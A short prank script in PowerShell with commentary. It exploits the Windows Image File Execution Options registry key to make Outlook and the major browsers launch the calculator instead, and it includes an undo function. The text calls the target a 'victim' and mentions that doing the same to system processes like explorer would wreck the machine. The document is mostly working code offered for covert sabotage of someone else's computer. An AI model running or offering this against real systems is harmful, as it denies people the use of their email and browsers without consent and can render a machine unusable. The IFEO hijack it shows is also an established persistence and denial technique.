# It turns out that windows has a feature built in that is intended to help developers to debug startup code in various types of programs. How it works is that you can set a registry key value, and any time a process for foo.exe is launched, windows will instead run the command "debugger.exe foo.exe".

# The part where this gets evil is that windows doesn't have any way of verifying that your 'debugger' is anything of the sort. So you can use this to remap all of a person's most used programs to solitaire. Want to start outlook.exe? Have some solitaire. Want to run chrome.exe? Have some solitaire. It doesn't matter how the process is launched, the OS intercepts it and runs the alternate 'debugger'.

# This was more fun when windows actually shipped with sol.exe In the default system path. I think solitaire is now some windows store abomination,so This script uses the calculator app instead:
function enable-solitaire {
  param(
    [Parameter(ValueFromPipeline = $true,Mandatory = $true)]
    [string]$executable
  )

  process {
    $path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$executable"
    if (-not (Test-Path $path)) {
      New-Item $path
      New-ItemProperty -Path $path -Name "Debugger" -Value 'calc.exe'
    }
  }
}

function disable-solitaire {
  param(
    [Parameter(ValueFromPipeline = $true,Mandatory = $true)]
    [string]$executable
  )

  process {
    Remove-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$executable"
  }
}

> 'outlook.exe','iexplore.exe','chrome.exe','firefox.exe' | enable-solitaire

# Now your victim can no longer run any of the three major browsers and they can no longer start outlook. There is only the calculator.

# Be careful not to enable this for system processes like explorer unless you want to completely hose their machine.
